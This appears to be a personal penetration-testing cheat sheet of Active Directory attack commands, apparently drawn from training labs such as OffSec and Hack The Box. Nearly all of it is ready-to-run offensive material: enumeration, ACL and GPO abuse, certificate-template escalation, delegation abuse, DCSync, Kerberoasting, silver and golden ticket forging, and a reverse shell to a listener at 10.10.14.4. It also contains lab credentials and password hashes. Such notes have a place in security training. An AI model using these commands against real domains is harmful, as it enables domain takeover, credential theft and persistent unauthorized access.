### Enterprise Admins
>Members of Domain Admins3 are among the most privileged objects in the domain. If an attacker compromises a member of this group (often referred to as domain administrators), they essentially gain complete control over the domain.

>This attack vector could extend beyond a single domain since an AD instance can host more than one domain in a domain tree or multiple domain trees in a domain forest. While there is a Domain Admins group for each domain in the forest, members of the Enterprise Admins group are granted full control over all the domains in the forest and have Administrator privilege on all DCs. This is obviously a high-value target for an attacker.
### Auto Enumeration 
```
```
### Enumeration
>net.exe cant enumerate group members within groups,only user members
```
net user
net user /domain
net user jeff_admin /domain
net group groupname /domain
net localgroup
net localgroup groupname

PowerView.ps1:
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-DomainGroup | select cn
```

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
output:
Forest                  : corp.com
DomainControllers       : {DC01.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner(DC name)   : DC01.corp.com
RidRoleOwner            : DC01.corp.com
InfrastructureRoleOwner : DC01.corp.com
Name(domain name)       : corp.com

PowerView.ps1:
Get-NetDomain
```
Active Directory User Enumeration
```
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt <IP>
```
```
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
This method doesn't generate Windows event ID 4625: An account failed to log on, but does generate event ID 4768: A Kerberos authentication ticket (TGT) was requested
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
```
rpcclient -U "" -N 172.16.5.5
enumdomusers
```
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
ldapsearch -x -H ldap://192.168.151.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
```
#### Nested Groups
```
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-DomainGroup 'Service Personnel' | select samaccountname,memberof,member
Get-DomainGroup 'Service Personnel'

Get all belonged groups of user(michelle):
Get-DomainGroup -MemberIdentity 'michelle' | select samaccountname,memberof,member
Get-DomainGroup -MemberIdentity 'michelle' | select samaccountname
Get-DomainGroup -MemberIdentity 'michelle' 
```
#### Computer Info
```
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname,distinguishedname

output:
pwdlastset                    : 10/2/2022 10:19:40 PM
logoncount                    : 319
msds-generationid             : {89, 27, 90, 188...}
serverreferencebl             : CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DC1,OU=Domain Controllers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 10/13/2022 11:37:06 AM
name                          : DC1
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1000
samaccountname                : DC1$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 10/13/2022 6:37:06 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DC1,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=corp,DC=com
objectguid                    : 8db9e06d-068f-41bc-945d-221622bca952
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata         : {9/2/2022 11:10:48 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {TERMSRV/DC1, TERMSRV/DC1.corp.com, Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.corp.com, ldap/DC1.corp.com/ForestDnsZones.corp.com...}
usncreated                    : 12293
lastlogon                     : 10/18/2022 3:37:56 AM
badpwdcount                   : 0
cn                            : DC1
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 9/2/2022 11:10:48 PM
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 178663
ridsetreferences              : CN=RID Set,CN=DC1,OU=Domain Controllers,DC=corp,DC=com
dnshostname                   : DC1.corp.com
```
#### Logged On Users
```
Find possible local administrative access on computers under the current user context:
PowerView.ps1 : Find-LocalAdminAccess

Enumerate active sessions:
.\PsLoggedon.exe \\client74

Enumerate IP address based on computername such as client74:
Get-NetSession -ComputerName client74
```
#### Object Permissions
GenericAll: Full permissions on object  
GenericWrite: Edit certain attributes on the object  
WriteOwner: Change ownership of the object  
WriteDACL: Edit ACE's applied to object  
AllExtendedRights: Change password, reset password, etc.  
ForceChangePassword: Password change for object  
Self (Self-Membership): Add ourselves to for example a group  
```
powershell -ep bypass
Import-module .\PowerView.ps1

Find SIDs which has GenericAll Permission on "Management Department" Group:
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Find interesting domain object permissions whose permissions are GenericAll:
Find-InterestingDomainAcl | ? {$_.ActiveDirectoryRights -eq "GenericAll"}

Conver SIDs to UserAccount names:
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
```
When Stephanie has GenericAll permissions on "Management Department" group, you can add her to Management Department group
```
net group "Management Department" stephanie /add /domain
```
#### Enumerate Domain Shares
```
powershell -ep bypass
Import-module .\PowerView.ps1
Find-DomainShare
ls \\dc1.corp.com\"Important Files"\
type \\dc1.corp.com\"Important Files"\proof.txt
```
#### BloodHound
Initiation
```
Compromised machine: Import-Module .\SharpHound.ps1
Compromised machine: Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\

sudo neo4j stop
sudo neo4j start
kali: bloodhound
kali: username:neo4j, pass:zxdxxxxxxxxx
kali: drag zip file into bloodhound

or sharphound.exe -c All --outputdirectory C:\Users\f.frizzle\
```
Compatible Combination:
```
neo4j 4.4.26
bloodhound 4.3.1
SharpHound.ps1 1.1.1
```
#### Bloodhound-python
This will extract all json files if you have credential but no shell
```
bloodhound-python --dns-tcp -ns $IP -d hutch.offsec -u 'fmcsorley' -p 'CrabSharkJellyfish192' -c all
```
#### Abusing Read GMSAP Password
```
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
.\GMSAPasswordReader.exe --accountname=SVC_APACHE

[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 83AC7FECFBF44780E3AAF5D04DD368A5
[*]       aes128_cts_hmac_sha1 : 08E643C43F775FAC782EDBB04DD40541
[*]       aes256_cts_hmac_sha1 : 588C2BB865E771ECAADCB48ECCF4BCBCD421BF329B0133A213C83086F1A2E3D7
[*]       des_cbc_md5          : 9E340723700454E9

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 0AFF0D9DFA8B436E6688697B0A47B50C (NTLM Hash)
[*]       aes128_cts_hmac_sha1 : C958BEE96DEE78F9035F460B91EC6D86
[*]       aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988
[*]       des_cbc_md5          : 0804169DCECB6102
```
#### Abusing ReadLaps Password
>LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. 
```
lapsdumper -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec -l 192.168.153.122
lapsdumper -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc host
ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.153.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
#### Abusing GPO (Group Policy Object)
Check:
```
Import-Module .\PowerView.ps1
Get-NetGPO
Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9(gpcfilesyspath) -TargetType User -TargetName anirudh
```
Abuse:
```
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy" (add anirudh to local admin group)
gpupdate /force
```
#### Abusing "Group Policy Creator Owners"
Members of this group can create and modify Group Policy Objects in the domain
```
New-GPO -Name {{GPO-Name}} | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName "{GPO-Name}" --force
gpupdate /force
rlwrap nc -nlvp 464
.\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' cmd.exe -r 10.10.14.4:464
```
#### Linux Abuse of Over large Permission Over Group and Object
Add the user to the target group
```
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```
Change Existing user password
```
net rpc password "TargetUser" "test@password123" -U "sequel.htb"/"ControlledUser"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
```
#### Abusing WriteOwner over User
```
sudo timedatectl set-ntp off                                                                                          
sudo rdate -n 10.10.11.51 
python3 owneredit.py -action write -new-owner 'ControlledUser' -target 'TargetUser' 'domain'/'ControlledUser':'WqSZAF6CysDQbGb3'

python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ControlledUser' -target 'TargetUser' 'domain'/'ControlledUser':'WqSZAF6CysDQbGb3'

net rpc password "TargetUser" "test@password123" -U "sequel.htb"/"ControlledUser"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
```
#### Abusing Active Directory Certificates
Enumerating vulnerable certificates
```
certipy-ad find -u xxx -p xxxx -dc-ip xxx.xxx.xxx.xxx -stdout -vulnerable
```
###### AD CS Domain Escalation
```
https://github.com/ly4k/Certipy?tab=readme-ov-file#certificates
```
![image](https://github.com/user-attachments/assets/c6e89df4-194f-4e7b-a9c8-9b6c82a159b0)
```
ESC1:

certipy req -username 'ryan.cooper@sequel.htb' -password 'NuclearMosquito3' -ca 'sequel-DC-CA' -target dc.sequel.htb -template 'UserAuthentication' -upn administrator@sequel.htb
certipy auth -pfx administrator.pfx -username administrator -domain 'SEQUEL.HTB' -dc-ip 10.10.11.202

若 Certipy 在嘗試取得 TGT 時發生 「KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)」，這是因為 KDC 上未啟動 PKInit (Public Key Cryptography for Initial Authentication)

ESC9:
Suppose management_svc@certified.htb holds GenericWrite permissions over ca_operator@certified.htb, with the goal to compromise Administrator@certiified.htbb. The ESC9 certificate template, which ca_operator@certified.htb is permitted to enroll in, is configured with the CT_FLAG_NO_SECURITY_EXTENSION flag in its msPKI-Enrollment-Flag setting

certipy account update -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn Administrator
certipy req -username ca_operator@certified.htb -hashes 'FB54D1C05E301E024800C6AD99FE9B45' -ca certified-DC01-CA -template CertifiedAuthentication -dns DC01.certified.htb
certipy auth -pfx administrator.pfx -domain certified.htb
```

#### Resource Based Constrained Delegation Attack
```
Detection:
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericAll*' }

Output:
AceType               : AccessAllowed
ObjectDN(to)          : CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-537427935-490066102-1511301751-1000
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-537427935-490066102-1511301751-1105
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
Identity(from)        : resourced\L.Livingstone
```
Bloodhound showing GenericAll privileges on the Domain Controller  
![image](https://github.com/user-attachments/assets/8a75dfbe-58a3-44a6-a962-dd34daf4b465)
```
impacket-addcomputer resourced.local/l.livingstone(:password) -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
python3 rbcd.py -dc-ip 192.168.153.175 -t RESOURCEDC(hostname) -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.x.x

Alternate way:
impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
impacket-rbcd -action write -delegate-to "BACKUP01$" -delegate-from "myComputer$" corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
impacket-psexec administrator@backup01.corp.com -k -no-pass
```
![image](https://github.com/user-attachments/assets/dbf59a75-11c3-4517-b0e7-60f5894aba5b)
```
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache

Change resourcedc.resourced.local machin_ip_address in /etc/hosts

impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
```
#### Dump the local password hash and domain cached hash
```
Extract hashes from windows.old's sam and system file:

impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
```
#### Domain Controller Synchronization
>The DCSync permission implies having these permissions over the domain itself: DS-Replication-Get-Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set.

>To perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.

![image](https://github.com/user-attachments/assets/6fc92c9b-f6fc-49cc-a127-e8f41ba74ce2)
```
lsadump::dcsync /user:<user>
kali: impacket-secretsdump -just-dc corp.com/controlledUser:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

#### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
```
sekurlsa::logonpasswords
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
net use \\dc01(logon server)
klist
.\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
```
#### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
```
ASREPRoast with username list without pass:
impacket-GetNPUsers nara-security.com/ -dc-ip 192.168.209.30 -usersfile users.txt -format hashcat -outputfile hashes.txt

ASREPRoast with credential:
impacket-GetNPUsers nagoya-industries.com/Fiona.clark:Summer2023 -dc-ip 192.168.183.21  -request -outputfile hashes.asreproast 

hashcat -m 18200 -a 0 passwords_kerb.txt hashes.asreproast
```
```
Windows way:

.\Rubeus.exe asreproast /nowrap
hashcat -a 0 -m 18200 hashes.asreproast2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
#### Kerberoasting
>The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.

>Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.

>You need valid credentials inside the domain.
```
Check all SPNs within the domain:
setspn -Q */*
```
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
```
>Linux Way of Kerberoasting
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 domain/username:pass -outputfile <output_TGSs_file>
```
>Clock skew too great Error
```
sudo timedatectl set-ntp off
sudo rdate -n 10.10.10.100
Open a new terminal

sudo ntpdate -s domain
```
#### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
>Service hash required 

>Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.5 With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.
```
whoami /user
kerberos::purge
kerberos::golden /user:jeffadmin(impersonated user) /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part from whoami /user) /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(password hash of iis_service) /ptt
kerberos::list
```
```
Get Domain's sid:
Get-LocalUser -Name 'svc_mssql' | select name,sid(result without the last 3digits)

String Convert to NTLM hash:
https://codebeautify.org/ntlm-hash-generator

Get SPN:
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
or
Import-Module .\PowerView.ps1
setspn -L svc_mssql

Exploiting silver ticket:
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn doesnotmatter/dc.sequel.htb -user-id 500 Administrator
# To generate the TGS with AES key
impacket-ticketer -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> -user-id 500 Administrator

export KRB5CCNAME=/home/kali/Desktop/Administrator.ccache

Klist to view kerberos tickets

/etc/hosts:
192.168.227.21  sequel.htb dc.sequel.htb

#Always remember to sync the kdc time
impacket-mssqlclient -k dc.sequel.htb
```
#### Pass The Hash/Pass The Key
>In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.

>The attacker then "passes" this stolen ticket to authenticate themselves as the compromised user or service without needing to know the account's password.
```
sekurlsa::tickets /export (export all kirbi files)
kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
```
```
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Request the TGT with password
impacket-getTGT -dc-ip 10.10.11.60 frizz.htb/M.SchoolBus:'!suBcig@MehTed!R'
# If not provided, password is asked

# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

edit /etc/krb5.conf

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

# To convert tickets between Linux/Windows format with ticket_converter.py:
impacket-ticket_converter ticket.kirbi ticket.ccache
impacket-ticket_converter ticket.ccache ticket.kirbi
```
#### Privilege Escalation via azure ad sync
```
Windows: sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"

evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s .
adconnect.ps1
Get-ADConnectPassword
```
#### Shadow Credential Attack
```
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 05521294-1c22-cd5e-9836-5d22c2074ba7
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: g17jPEmM.pfx
[*] Must be used with password: TBwxEdb3kfdFrnTrYLb7
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

python gettgtpkinit.py -cert-pfx t0cZeyin.pfx -pfx-pass Ryk4iT9K3g7uEgqSfFG1 certified.htb/management_svc management_svc.ccache
2025-02-05 10:13:39,724 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-02-05 10:13:39,732 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT


2025-02-05 10:14:36,995 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-02-05 10:14:36,996 minikerberos INFO     1dde55cc8c3ee35511712e96382fd98c8b8c096506601a57901a9e3949763db6
INFO:minikerberos:1dde55cc8c3ee35511712e96382fd98c8b8c096506601a57901a9e3949763db6
2025-02-05 10:14:36,997 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

export KRB5CCNAME=management_svc.ccache
└─$ python3 ./PKINITtools/getnthash.py -key 1dde55cc8c3ee35511712e96382fd98c8b8c096506601a57901a9e3949763db6 certified.htb/management_svc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

### Persistence
#### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
>The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method
```
privilege::debug
lsadump::lsa /patch(get password hash)
kerberos::purge
kerberos::golden /user:any_exist_domain_user /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part,from lsadump::lsa /patch) /krbtgt:75b60230a2394a812000dbfad8415965(from lsadump::lsa /patch) /ptt
misc::cmd(launch a new command prompt)
psexec.exe \\dc01 cmd.exe

# To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
# To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

### Tips
>Always remeber to sync the kdc timestamp before conducting any AD actions such as reset password of another user
```
sudo timedatectl set-ntp off
sudo rdate -n 10.10.10.100
Open a new terminal

sudo ntpdate -s doamin
```
>Fix "module 'OpenSSL.crypto' has no attribute 'PKCS12'" error
```
wget http://launchpadlibrarian.net/732112002/python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb
sudo dpkg -i python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb 

wget http://launchpadlibrarian.net/715850281/python3-openssl_24.0.0-1_all.deb
sudo dpkg -i python3-openssl_24.0.0-1_all.deb
```
